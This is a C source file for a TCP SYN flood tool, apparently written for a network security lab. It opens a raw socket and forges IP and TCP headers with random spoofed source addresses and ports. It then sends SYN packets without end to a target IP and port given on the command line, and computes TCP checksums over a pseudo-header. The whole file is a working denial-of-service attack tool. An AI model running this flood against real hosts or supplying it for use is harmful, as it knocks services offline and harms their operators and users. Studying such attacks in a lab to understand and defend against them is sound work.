#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include "packet_structs.h"

//#define DEST_IP    "10.9.0.5"
//#define DEST_PORT  8080  
#define PACKET_LEN 1500

unsigned short calculate_tcp_checksum(struct ipheader *ip);

// send a packet must be sent on a raw socket to directly modify headers
void send_raw_ip_packet(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // socket file descriptor IPPROTO_RAW = raw socket 
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // this functions tells kernel we will provide IP header
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
                     &enable, sizeof(enable));
 
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;


    sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}


int main(int argc, char *argv[]) {
   char buffer[PACKET_LEN];
   struct ipheader *ip = (struct ipheader *) buffer;
   struct tcpheader *tcp = (struct tcpheader *) (buffer +
                                   sizeof(struct ipheader));

   if (argc < 3) {
     printf("Please provide IP and Port number\n");
     printf("Usage: synflood ip port\n");
     return 1;
   }

   char *DEST_IP   = argv[1];
   int DEST_PORT   = atoi(argv[2]);


   // using time as seed for random
   srand(time(0)); 
   while (1) {
     memset(buffer, 0, PACKET_LEN);
     
     // tcp header
     tcp->tcp_sport = rand(); // random source port
     tcp->tcp_dport = htons(DEST_PORT);
     tcp->tcp_seq   = rand(); // random sequence 
     tcp->tcp_offx2 = 0x50; // header size = 20 bytes 
     tcp->tcp_flags = TH_SYN; // Enable the SYN bit
     tcp->tcp_win   = htons(20000); // window length
     tcp->tcp_sum   = 0;

     // IP header
     ip->iph_ver = 4;   // IPv4
     ip->iph_ihl = 5;   // header length 4 * 5 = 20 bytes
     ip->iph_ttl = 60;  
     ip->iph_sourceip.s_addr = rand(); // rand source IP 
     ip->iph_destip.s_addr = inet_addr(DEST_IP);
     ip->iph_protocol = IPPROTO_TCP; 
     ip->iph_len = htons(sizeof(struct ipheader) +
                         sizeof(struct tcpheader));

    // checksum for tcp
     tcp->tcp_sum = calculate_tcp_checksum(ip);

     send_raw_ip_packet(ip);
   }

   return 0;
}


unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
   sum += (sum >> 16);                  // add carry
   return (unsigned short)(~sum);
}



// calculate the tcp checksum using the psuedo header
// psuedo header includes fields from the ip layer
// the psuedo header just puts all the info needed for the checksum in one contiguous memory location
unsigned short calculate_tcp_checksum(struct ipheader *ip)
{
   // extract tcp header from IP header by using the offset of the ip header
   struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip +
                            sizeof(struct ipheader));

   // length of tcp segment
   int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);

   // need to use the psuedo tcp header calculate checksum 
   struct pseudo_tcp p_tcp;
   memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

  // fill fields in the psuedo header 
   p_tcp.saddr  = ip->iph_sourceip.s_addr;
   p_tcp.daddr  = ip->iph_destip.s_addr;
   p_tcp.mbz    = 0;
   p_tcp.ptcl   = IPPROTO_TCP;
   p_tcp.tcpl   = htons(tcp_len);
   memcpy(&p_tcp.tcp, tcp, tcp_len);

   return  (unsigned short) in_cksum((unsigned short *)&p_tcp, tcp_len + 12);
}

